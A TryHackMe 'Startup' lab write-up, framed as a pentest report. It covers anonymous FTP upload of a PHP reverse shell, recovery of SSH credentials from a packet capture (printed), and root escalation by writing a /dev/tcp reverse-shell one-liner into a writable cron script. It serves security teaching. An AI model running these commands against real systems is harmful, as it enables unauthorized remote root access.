---
title: "TryHackMe Writeup: Startup"
date: 2025-11-28
description: "Multi-vector assessment involving anonymous FTP, traffic analysis (PCAP), and insecure Cron job exploitation."
tags: ["tryhackme", "ftp-anonymous", "pcap", "cron", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

Security assessment conducted following PTES and NIST SP 800-115 methodologies. The compromise began via an anonymous FTP service with write permissions. Post-exploitation involved network traffic analysis (PCAP) to harvest credentials, leading to full privilege escalation through a writable script executed by a root-level Cron job.

### Attack Chain (PTES Mapping)

#### 1. Reconnaissance & Initial Access
FTP service was found allowing anonymous login with write access in the shared directory.
```bash
nmap -Pn -sS -p- -T4 -sV 10.64.188.136
```
A reverse shell was uploaded via FTP and executed through the web server (`/files/ftp/shell.php`).
* **MITRE Technique:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application.

#### 2. Lateral Movement
Internal enumeration revealed a packet capture file (`suspecious.pcapng`). Analysis of the traffic revealed cleartext SSH credentials for the user `lennie`.
```bash
# Creds found: lennie:c4ntg3t3n0ughsp1c3
ssh lennie@10.64.188.136
```
* **MITRE Technique:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Unsecured Credentials: Password in Files.

#### 3. Post-Exploitation (Privilege Escalation)
A Cron job was found running a script (`/etc/print.sh`) that was writable by the user `lennie`.
```bash
ls -l /etc/print.sh # -rwx------ 1 lennie lennie
```
The script was modified to execute a reverse shell, which was triggered by the system Cron as root.
```bash
echo 'sh -i >& /dev/tcp/<IP>/4444 0>&1' > /etc/print.sh
```
* **MITRE Technique:** [T1053.003](https://attack.mitre.org/techniques/T1053/003/) - Scheduled Task/Job: Cron.

### Recommendations (NIST SP 800-115)

* **Service Hardening:** Disable anonymous FTP login and restrict write permissions.
* **Sensitive Data Exposure:** Ensure packet captures and sensitive logs are not accessible to low-privileged users.
* **Secure Automation:** Audit all system scripts executed by Cron jobs. Ensure they are owned by root and are not world-writable or writable by standard users.